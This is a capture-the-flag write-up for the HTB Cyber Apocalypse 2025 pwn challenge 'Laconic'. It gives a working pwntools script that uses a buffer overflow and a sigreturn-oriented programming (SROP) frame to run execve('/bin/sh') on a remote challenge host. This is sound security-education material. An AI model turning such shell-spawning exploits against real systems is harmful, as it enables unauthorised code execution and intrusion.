---
title: Laconic
date: 2025-03-29T18:36:19+02:00
description: Writeup for Laconic [HTB Cyber Apocalypse CTF 2025]
type: writeup
author: sunbather
tags:
- pwn
- srop
draft: false
---
___

## Challenge Description

Sir Alaric's struggles have plunged him into a deep and overwhelming sadness, leaving him unwilling to speak to anyone. Can you find a way to lift his spirits and bring back his courage?

## Intuition

Super small binary, written directly in assembly. Here is the disassembly:

```
$ objdump -d laconic -M intel

laconic:     file format elf64-x86-64


Disassembly of section .shellcode:

0000000000043000 <__start>:
   43000:	48 c7 c7 00 00 00 00 	mov    rdi,0x0
   43007:	48 89 e6             	mov    rsi,rsp
   4300a:	48 83 ee 08          	sub    rsi,0x8
   4300e:	48 c7 c2 06 01 00 00 	mov    rdx,0x106
   43015:	0f 05                	syscall 
   43017:	c3                   	ret    
   43018:	58                   	pop    rax
   43019:	c3                   	ret    
```

The `syscall` instruction is executing a read (`rax = 0x0`, you can see it dynamically). Size of read is `0x106` and target is `rsp` according to `mov rsi,rsp`.

So obviously this is a buffer overflow as I can immediately write the return addresses. Size is huge `0x106` so we can perform SROP. Let's debug to find everything:

```
$ gdb laconic -q
pwndbg> start
[...]
pwndbg> search "/bin/sh"
Searching for value: '/bin/sh'
laconic         0x43238 0x68732f6e69622f /* '/bin/sh' */
```

Additionally we have the addresses for a few gadgetsa in the initial `objdump`:

- `pop rax` -- `0x43018`
- `syscall` -- `0x43015`

## Solution

Script is quite simple, just classic SROP.

```py
#!/usr/bin/env python3

from pwn import *

context.clear()
context.arch = "amd64"

#target = process("./laconic")
target = remote("83.136.251.145", 30750)

sh_addr = 0x43238
syscall_gadget = 0x43015
pop_rax = 0x43018

frame = SigreturnFrame()
frame.rax = 59 # syscall code for execve
frame.rdi = sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0
frame.rip = syscall_gadget

payload = b"a" * 8 + p64(pop_rax) + p64(15) + p64(syscall_gadget) + bytes(frame)

target.send(payload)
target.interactive()
```

### Flag

`HTB{s1l3nt_r0p_SOME_UNIQUE_ID}`
